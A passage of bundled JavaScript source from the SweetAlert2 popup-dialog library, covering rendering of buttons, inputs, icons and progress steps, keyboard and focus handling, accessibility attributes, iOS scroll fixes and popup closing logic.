            confirmButton.style.backgroundColor = params.confirmButtonColor;
            addClass(confirmButton, swalClasses["default-outline"]);
        }
        if (params.denyButtonColor) {
            denyButton.style.backgroundColor = params.denyButtonColor;
            addClass(denyButton, swalClasses["default-outline"]);
        }
        if (params.cancelButtonColor) {
            cancelButton.style.backgroundColor = params.cancelButtonColor;
            addClass(cancelButton, swalClasses["default-outline"]);
        }
    }
    /**
   * @param {HTMLElement} button
   * @param {'confirm' | 'deny' | 'cancel'} buttonType
   * @param {SweetAlertOptions} params
   */ function renderButton(button, buttonType, params) {
        toggle(button, params[`show${capitalizeFirstLetter(buttonType)}Button`], "inline-block");
        setInnerHtml(button, params[`${buttonType}ButtonText`]); // Set caption text
        button.setAttribute("aria-label", params[`${buttonType}ButtonAriaLabel`]); // ARIA label
        // Add buttons custom classes
        button.className = swalClasses[buttonType];
        applyCustomClass(button, params, `${buttonType}Button`);
        addClass(button, params[`${buttonType}ButtonClass`]);
    }
    /**
   * @param {SweetAlert2} instance
   * @param {SweetAlertOptions} params
   */ const renderCloseButton = (instance, params)=>{
        const closeButton = getCloseButton();
        setInnerHtml(closeButton, params.closeButtonHtml);
        // Custom class
        applyCustomClass(closeButton, params, "closeButton");
        toggle(closeButton, params.showCloseButton);
        closeButton.setAttribute("aria-label", params.closeButtonAriaLabel);
    };
    /**
   * @param {SweetAlert2} instance
   * @param {SweetAlertOptions} params
   */ const renderContainer = (instance, params)=>{
        const container = getContainer();
        if (!container) return;
        handleBackdropParam(container, params.backdrop);
        handlePositionParam(container, params.position);
        handleGrowParam(container, params.grow);
        // Custom class
        applyCustomClass(container, params, "container");
    };
    /**
   * @param {HTMLElement} container
   * @param {SweetAlertOptions['backdrop']} backdrop
   */ function handleBackdropParam(container, backdrop) {
        if (typeof backdrop === "string") container.style.background = backdrop;
        else if (!backdrop) addClass([
            document.documentElement,
            document.body
        ], swalClasses["no-backdrop"]);
    }
    /**
   * @param {HTMLElement} container
   * @param {SweetAlertOptions['position']} position
   */ function handlePositionParam(container, position) {
        if (position in swalClasses) addClass(container, swalClasses[position]);
        else {
            warn('The "position" parameter is not valid, defaulting to "center"');
            addClass(container, swalClasses.center);
        }
    }
    /**
   * @param {HTMLElement} container
   * @param {SweetAlertOptions['grow']} grow
   */ function handleGrowParam(container, grow) {
        if (grow && typeof grow === "string") {
            const growClass = `grow-${grow}`;
            if (growClass in swalClasses) addClass(container, swalClasses[growClass]);
        }
    }
    /// <reference path="../../../../sweetalert2.d.ts"/>
    /** @type {InputClass[]} */ const inputClasses = [
        "input",
        "file",
        "range",
        "select",
        "radio",
        "checkbox",
        "textarea"
    ];
    /**
   * @param {SweetAlert2} instance
   * @param {SweetAlertOptions} params
   */ const renderInput = (instance, params)=>{
        const popup = getPopup();
        const innerParams = privateProps.innerParams.get(instance);
        const rerender = !innerParams || params.input !== innerParams.input;
        inputClasses.forEach((inputClass)=>{
            const inputContainer = getDirectChildByClass(popup, swalClasses[inputClass]);
            // set attributes
            setAttributes(inputClass, params.inputAttributes);
            // set class
            inputContainer.className = swalClasses[inputClass];
            if (rerender) hide(inputContainer);
        });
        if (params.input) {
            if (rerender) showInput(params);
            // set custom class
            setCustomClass(params);
        }
    };
    /**
   * @param {SweetAlertOptions} params
   */ const showInput = (params)=>{
        if (!renderInputType[params.input]) {
            error(`Unexpected type of input! Expected "text", "email", "password", "number", "tel", "select", "radio", "checkbox", "textarea", "file" or "url", got "${params.input}"`);
            return;
        }
        const inputContainer = getInputContainer(params.input);
        const input = renderInputType[params.input](inputContainer, params);
        show(inputContainer);
        // input autofocus
        setTimeout(()=>{
            focusInput(input);
        });
    };
    /**
   * @param {HTMLInputElement} input
   */ const removeAttributes = (input)=>{
        for(let i = 0; i < input.attributes.length; i++){
            const attrName = input.attributes[i].name;
            if (![
                "type",
                "value",
                "style"
            ].includes(attrName)) input.removeAttribute(attrName);
        }
    };
    /**
   * @param {InputClass} inputClass
   * @param {SweetAlertOptions['inputAttributes']} inputAttributes
   */ const setAttributes = (inputClass, inputAttributes)=>{
        const input = getInput$1(getPopup(), inputClass);
        if (!input) return;
        removeAttributes(input);
        for(const attr in inputAttributes)input.setAttribute(attr, inputAttributes[attr]);
    };
    /**
   * @param {SweetAlertOptions} params
   */ const setCustomClass = (params)=>{
        const inputContainer = getInputContainer(params.input);
        if (typeof params.customClass === "object") addClass(inputContainer, params.customClass.input);
    };
    /**
   * @param {HTMLInputElement | HTMLTextAreaElement} input
   * @param {SweetAlertOptions} params
   */ const setInputPlaceholder = (input, params)=>{
        if (!input.placeholder || params.inputPlaceholder) input.placeholder = params.inputPlaceholder;
    };
    /**
   * @param {Input} input
   * @param {Input} prependTo
   * @param {SweetAlertOptions} params
   */ const setInputLabel = (input, prependTo, params)=>{
        if (params.inputLabel) {
            input.id = swalClasses.input;
            const label = document.createElement("label");
            const labelClass = swalClasses["input-label"];
            label.setAttribute("for", input.id);
            label.className = labelClass;
            if (typeof params.customClass === "object") addClass(label, params.customClass.inputLabel);
            label.innerText = params.inputLabel;
            prependTo.insertAdjacentElement("beforebegin", label);
        }
    };
    /**
   * @param {SweetAlertOptions['input']} inputType
   * @returns {HTMLElement}
   */ const getInputContainer = (inputType)=>{
        return getDirectChildByClass(getPopup(), swalClasses[inputType] || swalClasses.input);
    };
    /**
   * @param {HTMLInputElement | HTMLOutputElement | HTMLTextAreaElement} input
   * @param {SweetAlertOptions['inputValue']} inputValue
   */ const checkAndSetInputValue = (input, inputValue)=>{
        if ([
            "string",
            "number"
        ].includes(typeof inputValue)) input.value = `${inputValue}`;
        else if (!isPromise(inputValue)) warn(`Unexpected type of inputValue! Expected "string", "number" or "Promise", got "${typeof inputValue}"`);
    };
    /** @type {Record<string, (input: Input | HTMLElement, params: SweetAlertOptions) => Input>} */ const renderInputType = {};
    /**
   * @param {HTMLInputElement} input
   * @param {SweetAlertOptions} params
   * @returns {HTMLInputElement}
   */ renderInputType.text = renderInputType.email = renderInputType.password = renderInputType.number = renderInputType.tel = renderInputType.url = (input, params)=>{
        checkAndSetInputValue(input, params.inputValue);
        setInputLabel(input, input, params);
        setInputPlaceholder(input, params);
        input.type = params.input;
        return input;
    };
    /**
   * @param {HTMLInputElement} input
   * @param {SweetAlertOptions} params
   * @returns {HTMLInputElement}
   */ renderInputType.file = (input, params)=>{
        setInputLabel(input, input, params);
        setInputPlaceholder(input, params);
        return input;
    };
    /**
   * @param {HTMLInputElement} range
   * @param {SweetAlertOptions} params
   * @returns {HTMLInputElement}
   */ renderInputType.range = (range, params)=>{
        const rangeInput = range.querySelector("input");
        const rangeOutput = range.querySelector("output");
        checkAndSetInputValue(rangeInput, params.inputValue);
        rangeInput.type = params.input;
        checkAndSetInputValue(rangeOutput, params.inputValue);
        setInputLabel(rangeInput, range, params);
        return range;
    };
    /**
   * @param {HTMLSelectElement} select
   * @param {SweetAlertOptions} params
   * @returns {HTMLSelectElement}
   */ renderInputType.select = (select, params)=>{
        select.textContent = "";
        if (params.inputPlaceholder) {
            const placeholder = document.createElement("option");
            setInnerHtml(placeholder, params.inputPlaceholder);
            placeholder.value = "";
            placeholder.disabled = true;
            placeholder.selected = true;
            select.appendChild(placeholder);
        }
        setInputLabel(select, select, params);
        return select;
    };
    /**
   * @param {HTMLInputElement} radio
   * @returns {HTMLInputElement}
   */ renderInputType.radio = (radio)=>{
        radio.textContent = "";
        return radio;
    };
    /**
   * @param {HTMLLabelElement} checkboxContainer
   * @param {SweetAlertOptions} params
   * @returns {HTMLInputElement}
   */ renderInputType.checkbox = (checkboxContainer, params)=>{
        const checkbox = getInput$1(getPopup(), "checkbox");
        checkbox.value = "1";
        checkbox.id = swalClasses.checkbox;
        checkbox.checked = Boolean(params.inputValue);
        const label = checkboxContainer.querySelector("span");
        setInnerHtml(label, params.inputPlaceholder);
        return checkbox;
    };
    /**
   * @param {HTMLTextAreaElement} textarea
   * @param {SweetAlertOptions} params
   * @returns {HTMLTextAreaElement}
   */ renderInputType.textarea = (textarea, params)=>{
        checkAndSetInputValue(textarea, params.inputValue);
        setInputPlaceholder(textarea, params);
        setInputLabel(textarea, textarea, params);
        /**
     * @param {HTMLElement} el
     * @returns {number}
     */ const getMargin = (el)=>parseInt(window.getComputedStyle(el).marginLeft) + parseInt(window.getComputedStyle(el).marginRight);
        // https://github.com/sweetalert2/sweetalert2/issues/2291
        setTimeout(()=>{
            // https://github.com/sweetalert2/sweetalert2/issues/1699
            if ("MutationObserver" in window) {
                const initialPopupWidth = parseInt(window.getComputedStyle(getPopup()).width);
                const textareaResizeHandler = ()=>{
                    const textareaWidth = textarea.offsetWidth + getMargin(textarea);
                    if (textareaWidth > initialPopupWidth) getPopup().style.width = `${textareaWidth}px`;
                    else getPopup().style.width = null;
                };
                new MutationObserver(textareaResizeHandler).observe(textarea, {
                    attributes: true,
                    attributeFilter: [
                        "style"
                    ]
                });
            }
        });
        return textarea;
    };
    /**
   * @param {SweetAlert2} instance
   * @param {SweetAlertOptions} params
   */ const renderContent = (instance, params)=>{
        const htmlContainer = getHtmlContainer();
        applyCustomClass(htmlContainer, params, "htmlContainer");
        // Content as HTML
        if (params.html) {
            parseHtmlToContainer(params.html, htmlContainer);
            show(htmlContainer, "block");
        } else if (params.text) {
            htmlContainer.textContent = params.text;
            show(htmlContainer, "block");
        } else hide(htmlContainer);
        renderInput(instance, params);
    };
    /**
   * @param {SweetAlert2} instance
   * @param {SweetAlertOptions} params
   */ const renderFooter = (instance, params)=>{
        const footer = getFooter();
        toggle(footer, params.footer);
        if (params.footer) parseHtmlToContainer(params.footer, footer);
        // Custom class
        applyCustomClass(footer, params, "footer");
    };
    /**
   * @param {SweetAlert2} instance
   * @param {SweetAlertOptions} params
   */ const renderIcon = (instance, params)=>{
        const innerParams = privateProps.innerParams.get(instance);
        const icon = getIcon();
        // if the given icon already rendered, apply the styling without re-rendering the icon
        if (innerParams && params.icon === innerParams.icon) {
            // Custom or default content
            setContent(icon, params);
            applyStyles(icon, params);
            return;
        }
        if (!params.icon && !params.iconHtml) {
            hide(icon);
            return;
        }
        if (params.icon && Object.keys(iconTypes).indexOf(params.icon) === -1) {
            error(`Unknown icon! Expected "success", "error", "warning", "info" or "question", got "${params.icon}"`);
            hide(icon);
            return;
        }
        show(icon);
        // Custom or default content
        setContent(icon, params);
        applyStyles(icon, params);
        // Animate icon
        addClass(icon, params.showClass.icon);
    };
    /**
   * @param {HTMLElement} icon
   * @param {SweetAlertOptions} params
   */ const applyStyles = (icon, params)=>{
        for(const iconType in iconTypes)if (params.icon !== iconType) removeClass(icon, iconTypes[iconType]);
        addClass(icon, iconTypes[params.icon]);
        // Icon color
        setColor(icon, params);
        // Success icon background color
        adjustSuccessIconBackgroundColor();
        // Custom class
        applyCustomClass(icon, params, "icon");
    };
    // Adjust success icon background color to match the popup background color
    const adjustSuccessIconBackgroundColor = ()=>{
        const popup = getPopup();
        const popupBackgroundColor = window.getComputedStyle(popup).getPropertyValue("background-color");
        /** @type {NodeListOf<HTMLElement>} */ const successIconParts = popup.querySelectorAll("[class^=swal2-success-circular-line], .swal2-success-fix");
        for(let i = 0; i < successIconParts.length; i++)successIconParts[i].style.backgroundColor = popupBackgroundColor;
    };
    const successIconHtml = `
  <div class="swal2-success-circular-line-left"></div>
  <span class="swal2-success-line-tip"></span> <span class="swal2-success-line-long"></span>
  <div class="swal2-success-ring"></div> <div class="swal2-success-fix"></div>
  <div class="swal2-success-circular-line-right"></div>
`;
    const errorIconHtml = `
  <span class="swal2-x-mark">
    <span class="swal2-x-mark-line-left"></span>
    <span class="swal2-x-mark-line-right"></span>
  </span>
`;
    /**
   * @param {HTMLElement} icon
   * @param {SweetAlertOptions} params
   */ const setContent = (icon, params)=>{
        let oldContent = icon.innerHTML;
        let newContent;
        if (params.iconHtml) newContent = iconContent(params.iconHtml);
        else if (params.icon === "success") {
            newContent = successIconHtml;
            oldContent = oldContent.replace(/ style=".*?"/g, ""); // undo adjustSuccessIconBackgroundColor()
        } else if (params.icon === "error") newContent = errorIconHtml;
        else {
            const defaultIconHtml = {
                question: "?",
                warning: "!",
                info: "i"
            };
            newContent = iconContent(defaultIconHtml[params.icon]);
        }
        if (oldContent.trim() !== newContent.trim()) setInnerHtml(icon, newContent);
    };
    /**
   * @param {HTMLElement} icon
   * @param {SweetAlertOptions} params
   */ const setColor = (icon, params)=>{
        if (!params.iconColor) return;
        icon.style.color = params.iconColor;
        icon.style.borderColor = params.iconColor;
        for (const sel of [
            ".swal2-success-line-tip",
            ".swal2-success-line-long",
            ".swal2-x-mark-line-left",
            ".swal2-x-mark-line-right"
        ])setStyle(icon, sel, "backgroundColor", params.iconColor);
        setStyle(icon, ".swal2-success-ring", "borderColor", params.iconColor);
    };
    /**
   * @param {string} content
   * @returns {string}
   */ const iconContent = (content)=>`<div class="${swalClasses["icon-content"]}">${content}</div>`;
    /**
   * @param {SweetAlert2} instance
   * @param {SweetAlertOptions} params
   */ const renderImage = (instance, params)=>{
        const image = getImage();
        if (!params.imageUrl) {
            hide(image);
            return;
        }
        show(image, "");
        // Src, alt
        image.setAttribute("src", params.imageUrl);
        image.setAttribute("alt", params.imageAlt);
        // Width, height
        applyNumericalStyle(image, "width", params.imageWidth);
        applyNumericalStyle(image, "height", params.imageHeight);
        // Class
        image.className = swalClasses.image;
        applyCustomClass(image, params, "image");
    };
    /**
   * @param {SweetAlert2} instance
   * @param {SweetAlertOptions} params
   */ const renderPopup = (instance, params)=>{
        const container = getContainer();
        const popup = getPopup();
        // Width
        // https://github.com/sweetalert2/sweetalert2/issues/2170
        if (params.toast) {
            applyNumericalStyle(container, "width", params.width);
            popup.style.width = "100%";
            popup.insertBefore(getLoader(), getIcon());
        } else applyNumericalStyle(popup, "width", params.width);
        // Padding
        applyNumericalStyle(popup, "padding", params.padding);
        // Color
        if (params.color) popup.style.color = params.color;
        // Background
        if (params.background) popup.style.background = params.background;
        hide(getValidationMessage());
        // Classes
        addClasses$1(popup, params);
    };
    /**
   * @param {HTMLElement} popup
   * @param {SweetAlertOptions} params
   */ const addClasses$1 = (popup, params)=>{
        // Default Class + showClass when updating Swal.update({})
        popup.className = `${swalClasses.popup} ${isVisible$1(popup) ? params.showClass.popup : ""}`;
        if (params.toast) {
            addClass([
                document.documentElement,
                document.body
            ], swalClasses["toast-shown"]);
            addClass(popup, swalClasses.toast);
        } else addClass(popup, swalClasses.modal);
        // Custom class
        applyCustomClass(popup, params, "popup");
        if (typeof params.customClass === "string") addClass(popup, params.customClass);
        // Icon class (#1842)
        if (params.icon) addClass(popup, swalClasses[`icon-${params.icon}`]);
    };
    /**
   * @param {SweetAlert2} instance
   * @param {SweetAlertOptions} params
   */ const renderProgressSteps = (instance, params)=>{
        const progressStepsContainer = getProgressSteps();
        if (!params.progressSteps || params.progressSteps.length === 0) {
            hide(progressStepsContainer);
            return;
        }
        show(progressStepsContainer);
        progressStepsContainer.textContent = "";
        if (params.currentProgressStep >= params.progressSteps.length) warn("Invalid currentProgressStep parameter, it should be less than progressSteps.length (currentProgressStep like JS arrays starts from 0)");
        params.progressSteps.forEach((step, index)=>{
            const stepEl = createStepElement(step);
            progressStepsContainer.appendChild(stepEl);
            if (index === params.currentProgressStep) addClass(stepEl, swalClasses["active-progress-step"]);
            if (index !== params.progressSteps.length - 1) {
                const lineEl = createLineElement(params);
                progressStepsContainer.appendChild(lineEl);
            }
        });
    };
    /**
   * @param {string} step
   * @returns {HTMLLIElement}
   */ const createStepElement = (step)=>{
        const stepEl = document.createElement("li");
        addClass(stepEl, swalClasses["progress-step"]);
        setInnerHtml(stepEl, step);
        return stepEl;
    };
    /**
   * @param {SweetAlertOptions} params
   * @returns {HTMLLIElement}
   */ const createLineElement = (params)=>{
        const lineEl = document.createElement("li");
        addClass(lineEl, swalClasses["progress-step-line"]);
        if (params.progressStepsDistance) applyNumericalStyle(lineEl, "width", params.progressStepsDistance);
        return lineEl;
    };
    /**
   * @param {SweetAlert2} instance
   * @param {SweetAlertOptions} params
   */ const renderTitle = (instance, params)=>{
        const title = getTitle();
        toggle(title, params.title || params.titleText, "block");
        if (params.title) parseHtmlToContainer(params.title, title);
        if (params.titleText) title.innerText = params.titleText;
        // Custom class
        applyCustomClass(title, params, "title");
    };
    /**
   * @param {SweetAlert2} instance
   * @param {SweetAlertOptions} params
   */ const render = (instance, params)=>{
        renderPopup(instance, params);
        renderContainer(instance, params);
        renderProgressSteps(instance, params);
        renderIcon(instance, params);
        renderImage(instance, params);
        renderTitle(instance, params);
        renderCloseButton(instance, params);
        renderContent(instance, params);
        renderActions(instance, params);
        renderFooter(instance, params);
        if (typeof params.didRender === "function") params.didRender(getPopup());
    };
    /**
   * Hides loader and shows back the button which was hidden by .showLoading()
   */ function hideLoading() {
        // do nothing if popup is closed
        const innerParams = privateProps.innerParams.get(this);
        if (!innerParams) return;
        const domCache = privateProps.domCache.get(this);
        hide(domCache.loader);
        if (isToast()) {
            if (innerParams.icon) show(getIcon());
        } else showRelatedButton(domCache);
        removeClass([
            domCache.popup,
            domCache.actions
        ], swalClasses.loading);
        domCache.popup.removeAttribute("aria-busy");
        domCache.popup.removeAttribute("data-loading");
        domCache.confirmButton.disabled = false;
        domCache.denyButton.disabled = false;
        domCache.cancelButton.disabled = false;
    }
    const showRelatedButton = (domCache)=>{
        const buttonToReplace = domCache.popup.getElementsByClassName(domCache.loader.getAttribute("data-button-to-replace"));
        if (buttonToReplace.length) show(buttonToReplace[0], "inline-block");
        else if (allButtonsAreHidden()) hide(domCache.actions);
    };
    /**
   * Gets the input DOM node, this method works with input parameter.
   *
   * @param {SweetAlert2} instance
   * @returns {HTMLElement | null}
   */ function getInput(instance) {
        const innerParams = privateProps.innerParams.get(instance || this);
        const domCache = privateProps.domCache.get(instance || this);
        if (!domCache) return null;
        return getInput$1(domCache.popup, innerParams.input);
    }
    /*
   * Global function to determine if SweetAlert2 popup is shown
   */ const isVisible = ()=>{
        return isVisible$1(getPopup());
    };
    /*
   * Global function to click 'Confirm' button
   */ const clickConfirm = ()=>getConfirmButton() && getConfirmButton().click();
    /*
   * Global function to click 'Deny' button
   */ const clickDeny = ()=>getDenyButton() && getDenyButton().click();
    /*
   * Global function to click 'Cancel' button
   */ const clickCancel = ()=>getCancelButton() && getCancelButton().click();
    const DismissReason = Object.freeze({
        cancel: "cancel",
        backdrop: "backdrop",
        close: "close",
        esc: "esc",
        timer: "timer"
    });
    /**
   * @param {GlobalState} globalState
   */ const removeKeydownHandler = (globalState)=>{
        if (globalState.keydownTarget && globalState.keydownHandlerAdded) {
            globalState.keydownTarget.removeEventListener("keydown", globalState.keydownHandler, {
                capture: globalState.keydownListenerCapture
            });
            globalState.keydownHandlerAdded = false;
        }
    };
    /**
   * @param {SweetAlert2} instance
   * @param {GlobalState} globalState
   * @param {SweetAlertOptions} innerParams
   * @param {*} dismissWith
   */ const addKeydownHandler = (instance, globalState, innerParams, dismissWith)=>{
        removeKeydownHandler(globalState);
        if (!innerParams.toast) {
            globalState.keydownHandler = (e)=>keydownHandler(instance, e, dismissWith);
            globalState.keydownTarget = innerParams.keydownListenerCapture ? window : getPopup();
            globalState.keydownListenerCapture = innerParams.keydownListenerCapture;
            globalState.keydownTarget.addEventListener("keydown", globalState.keydownHandler, {
                capture: globalState.keydownListenerCapture
            });
            globalState.keydownHandlerAdded = true;
        }
    };
    /**
   * @param {SweetAlertOptions} innerParams
   * @param {number} index
   * @param {number} increment
   */ const setFocus = (innerParams, index, increment)=>{
        const focusableElements = getFocusableElements();
        // search for visible elements and select the next possible match
        if (focusableElements.length) {
            index = index + increment;
            // rollover to first item
            if (index === focusableElements.length) index = 0;
            else if (index === -1) index = focusableElements.length - 1;
            focusableElements[index].focus();
            return;
        }
        // no visible focusable elements, focus the popup
        getPopup().focus();
    };
    const arrowKeysNextButton = [
        "ArrowRight",
        "ArrowDown"
    ];
    const arrowKeysPreviousButton = [
        "ArrowLeft",
        "ArrowUp"
    ];
    /**
   * @param {SweetAlert2} instance
   * @param {KeyboardEvent} e
   * @param {Function} dismissWith
   */ const keydownHandler = (instance, e, dismissWith)=>{
        const innerParams = privateProps.innerParams.get(instance);
        if (!innerParams) return; // This instance has already been destroyed
        // Ignore keydown during IME composition
        // https://developer.mozilla.org/en-US/docs/Web/API/Document/keydown_event#ignoring_keydown_during_ime_composition
        // https://github.com/sweetalert2/sweetalert2/issues/720
        // https://github.com/sweetalert2/sweetalert2/issues/2406
        if (e.isComposing || e.keyCode === 229) return;
        if (innerParams.stopKeydownPropagation) e.stopPropagation();
        // ENTER
        if (e.key === "Enter") handleEnter(instance, e, innerParams);
        else if (e.key === "Tab") handleTab(e, innerParams);
        else if ([
            ...arrowKeysNextButton,
            ...arrowKeysPreviousButton
        ].includes(e.key)) handleArrows(e.key);
        else if (e.key === "Escape") handleEsc(e, innerParams, dismissWith);
    };
    /**
   * @param {SweetAlert2} instance
   * @param {KeyboardEvent} e
   * @param {SweetAlertOptions} innerParams
   */ const handleEnter = (instance, e, innerParams)=>{
        // https://github.com/sweetalert2/sweetalert2/issues/2386
        if (!callIfFunction(innerParams.allowEnterKey)) return;
        if (e.target && instance.getInput() && e.target instanceof HTMLElement && e.target.outerHTML === instance.getInput().outerHTML) {
            if ([
                "textarea",
                "file"
            ].includes(innerParams.input)) return; // do not submit
            clickConfirm();
            e.preventDefault();
        }
    };
    /**
   * @param {KeyboardEvent} e
   * @param {SweetAlertOptions} innerParams
   */ const handleTab = (e, innerParams)=>{
        const targetElement = e.target;
        const focusableElements = getFocusableElements();
        let btnIndex = -1;
        for(let i = 0; i < focusableElements.length; i++)if (targetElement === focusableElements[i]) {
            btnIndex = i;
            break;
        }
        // Cycle to the next button
        if (!e.shiftKey) setFocus(innerParams, btnIndex, 1);
        else setFocus(innerParams, btnIndex, -1);
        e.stopPropagation();
        e.preventDefault();
    };
    /**
   * @param {string} key
   */ const handleArrows = (key)=>{
        const confirmButton = getConfirmButton();
        const denyButton = getDenyButton();
        const cancelButton = getCancelButton();
        if (document.activeElement instanceof HTMLElement && ![
            confirmButton,
            denyButton,
            cancelButton
        ].includes(document.activeElement)) return;
        const sibling = arrowKeysNextButton.includes(key) ? "nextElementSibling" : "previousElementSibling";
        let buttonToFocus = document.activeElement;
        for(let i = 0; i < getActions().children.length; i++){
            buttonToFocus = buttonToFocus[sibling];
            if (!buttonToFocus) return;
            if (buttonToFocus instanceof HTMLButtonElement && isVisible$1(buttonToFocus)) break;
        }
        if (buttonToFocus instanceof HTMLButtonElement) buttonToFocus.focus();
    };
    /**
   * @param {KeyboardEvent} e
   * @param {SweetAlertOptions} innerParams
   * @param {Function} dismissWith
   */ const handleEsc = (e, innerParams, dismissWith)=>{
        if (callIfFunction(innerParams.allowEscapeKey)) {
            e.preventDefault();
            dismissWith(DismissReason.esc);
        }
    };
    /**
   * This module contains `WeakMap`s for each effectively-"private  property" that a `Swal` has.
   * For example, to set the private property "foo" of `this` to "bar", you can `privateProps.foo.set(this, 'bar')`
   * This is the approach that Babel will probably take to implement private methods/fields
   *   https://github.com/tc39/proposal-private-methods
   *   https://github.com/babel/babel/pull/7555
   * Once we have the changes from that PR in Babel, and our core class fits reasonable in *one module*
   *   then we can use that language feature.
   */ var privateMethods = {
        swalPromiseResolve: new WeakMap(),
        swalPromiseReject: new WeakMap()
    };
    // From https://developer.paciellogroup.com/blog/2018/06/the-current-state-of-modal-dialog-accessibility/
    // Adding aria-hidden="true" to elements outside of the active modal dialog ensures that
    // elements not within the active modal dialog will not be surfaced if a user opens a screen
    // reader’s list of elements (headings, form controls, landmarks, etc.) in the document.
    const setAriaHidden = ()=>{
        const bodyChildren = Array.from(document.body.children);
        bodyChildren.forEach((el)=>{
            if (el === getContainer() || el.contains(getContainer())) return;
            if (el.hasAttribute("aria-hidden")) el.setAttribute("data-previous-aria-hidden", el.getAttribute("aria-hidden"));
            el.setAttribute("aria-hidden", "true");
        });
    };
    const unsetAriaHidden = ()=>{
        const bodyChildren = Array.from(document.body.children);
        bodyChildren.forEach((el)=>{
            if (el.hasAttribute("data-previous-aria-hidden")) {
                el.setAttribute("aria-hidden", el.getAttribute("data-previous-aria-hidden"));
                el.removeAttribute("data-previous-aria-hidden");
            } else el.removeAttribute("aria-hidden");
        });
    };
    /* istanbul ignore file */ // Fix iOS scrolling http://stackoverflow.com/q/39626302
    const iOSfix = ()=>{
        const iOS = // @ts-ignore
        /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream || navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1;
        if (iOS && !hasClass(document.body, swalClasses.iosfix)) {
            const offset = document.body.scrollTop;
            document.body.style.top = `${offset * -1}px`;
            addClass(document.body, swalClasses.iosfix);
            lockBodyScroll();
            addBottomPaddingForTallPopups();
        }
    };
    /**
   * https://github.com/sweetalert2/sweetalert2/issues/1948
   */ const addBottomPaddingForTallPopups = ()=>{
        const ua = navigator.userAgent;
        const iOS = !!ua.match(/iPad/i) || !!ua.match(/iPhone/i);
        const webkit = !!ua.match(/WebKit/i);
        const iOSSafari = iOS && webkit && !ua.match(/CriOS/i);
        if (iOSSafari) {
            const bottomPanelHeight = 44;
            if (getPopup().scrollHeight > window.innerHeight - bottomPanelHeight) getContainer().style.paddingBottom = `${bottomPanelHeight}px`;
        }
    };
    /**
   * https://github.com/sweetalert2/sweetalert2/issues/1246
   */ const lockBodyScroll = ()=>{
        const container = getContainer();
        let preventTouchMove;
        /**
     * @param {TouchEvent} e
     */ container.ontouchstart = (e)=>{
            preventTouchMove = shouldPreventTouchMove(e);
        };
        /**
     * @param {TouchEvent} e
     */ container.ontouchmove = (e)=>{
            if (preventTouchMove) {
                e.preventDefault();
                e.stopPropagation();
            }
        };
    };
    /**
   * @param {TouchEvent} event
   * @returns {boolean}
   */ const shouldPreventTouchMove = (event)=>{
        const target = event.target;
        const container = getContainer();
        if (isStylus(event) || isZoom(event)) return false;
        if (target === container) return true;
        if (!isScrollable(container) && target instanceof HTMLElement && target.tagName !== "INPUT" && // #1603
        target.tagName !== "TEXTAREA" && // #2266
        !(isScrollable(getHtmlContainer()) && // #1944
        getHtmlContainer().contains(target))) return true;
        return false;
    };
    /**
   * https://github.com/sweetalert2/sweetalert2/issues/1786
   *
   * @param {*} event
   * @returns {boolean}
   */ const isStylus = (event)=>{
        return event.touches && event.touches.length && event.touches[0].touchType === "stylus";
    };
    /**
   * https://github.com/sweetalert2/sweetalert2/issues/1891
   *
   * @param {TouchEvent} event
   * @returns {boolean}
   */ const isZoom = (event)=>{
        return event.touches && event.touches.length > 1;
    };
    const undoIOSfix = ()=>{
        if (hasClass(document.body, swalClasses.iosfix)) {
            const offset = parseInt(document.body.style.top, 10);
            removeClass(document.body, swalClasses.iosfix);
            document.body.style.top = "";
            document.body.scrollTop = offset * -1;
        }
    };
    const fixScrollbar = ()=>{
        // for queues, do not do this more than once
        if (states.previousBodyPadding !== null) return;
        // if the body has overflow
        if (document.body.scrollHeight > window.innerHeight) {
            // add padding so the content doesn't shift after removal of scrollbar
            states.previousBodyPadding = parseInt(window.getComputedStyle(document.body).getPropertyValue("padding-right"));
            document.body.style.paddingRight = `${states.previousBodyPadding + measureScrollbar()}px`;
        }
    };
    const undoScrollbar = ()=>{
        if (states.previousBodyPadding !== null) {
            document.body.style.paddingRight = `${states.previousBodyPadding}px`;
            states.previousBodyPadding = null;
        }
    };
    /*
   * Instance method to close sweetAlert
   */ function removePopupAndResetState(instance, container, returnFocus, didClose) {
        if (isToast()) triggerDidCloseAndDispose(instance, didClose);
        else {
            restoreActiveElement(returnFocus).then(()=>triggerDidCloseAndDispose(instance, didClose));
            removeKeydownHandler(globalState);
        }
        const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
        // workaround for #2088
        // for some reason removing the container in Safari will scroll the document to bottom
        if (isSafari) {
            container.setAttribute("style", "display:none !important");
            container.removeAttribute("class");
            container.innerHTML = "";
        } else container.remove();
        if (isModal()) {
            undoScrollbar();
            undoIOSfix();
            unsetAriaHidden();
        }
        removeBodyClasses();
    }
    function removeBodyClasses() {
        removeClass([
            document.documentElement,
            document.body
        ], [
            swalClasses.shown,
            swalClasses["height-auto"],
            swalClasses["no-backdrop"],
            swalClasses["toast-shown"]
        ]);
    }
    function close(resolveValue) {
        resolveValue = prepareResolveValue(resolveValue);
        const swalPromiseResolve = privateMethods.swalPromiseResolve.get(this);
        const didClose = triggerClosePopup(this);
        if (this.isAwaitingPromise()) // A swal awaiting for a promise (after a click on Confirm or Deny) cannot be dismissed anymore #2335
        {
            if (!resolveValue.isDismissed) {
                handleAwaitingPromise(this);
                swalPromiseResolve(resolveValue);
            }
        } else if (didClose) // Resolve Swal promise
        swalPromiseResolve(resolveValue);
    }
    function isAwaitingPromise() {
        return !!privateProps.awaitingPromise.get(this);
    }
    const triggerClosePopup = (instance)=>{
        const popup = getPopup();
        if (!popup) return false;
        const innerParams = privateProps.innerParams.get(instance);
        if (!innerParams || hasClass(popup, innerParams.hideClass.popup)) return false;
        removeClass(popup, innerParams.showClass.popup);
        addClass(popup, innerParams.hideClass.popup);
        const backdrop = getContainer();
        removeClass(backdrop, innerParams.showClass.backdrop);
        addClass(backdrop, innerParams.hideClass.backdrop);
        handlePopupAnimation(instance, popup, innerParams);
        return true;
    };
    function rejectPromise(error) {
        const rejectPromise = privateMethods.swalPromiseReject.get(this);
        handleAwaitingPromise(this);
        if (rejectPromise) // Reject Swal promise
        rejectPromise(error);
    }
    const handleAwaitingPromise = (instance)=>{
        if (instance.isAwaitingPromise()) {
            privateProps.awaitingPromise.delete(instance);
            // The instance might have been previously partly destroyed, we must resume the destroy process in this case #2335
            if (!privateProps.innerParams.get(instance)) instance._destroy();
        }
    };
